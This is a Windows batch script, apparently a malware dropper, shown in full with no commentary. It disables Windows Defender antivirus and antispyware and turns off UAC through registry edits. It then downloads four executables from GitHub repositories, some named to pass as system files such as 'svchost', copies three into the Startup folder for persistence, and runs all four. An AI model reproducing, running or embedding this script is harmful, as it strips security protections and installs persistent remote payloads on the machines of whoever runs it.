@echo off
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
curl -s -o "WindowsBootMenager".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/WindowsBootMenager.exe"
xcopy /y WindowsBootMenager.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
WindowsBootMenager.exe
curl -s -o "chromedrivers".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/chromedrivers.exe"
xcopy /y chromedrivers.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
chromedrivers.exe
curl -s -o "svchost".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/svchost.exe"
svchost.exe
curl -s -o "installer".exe -JL "https://github.com/DanGILC-137/Legend/raw/main/installer.exe"
xcopy /y installer.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
installer.exe
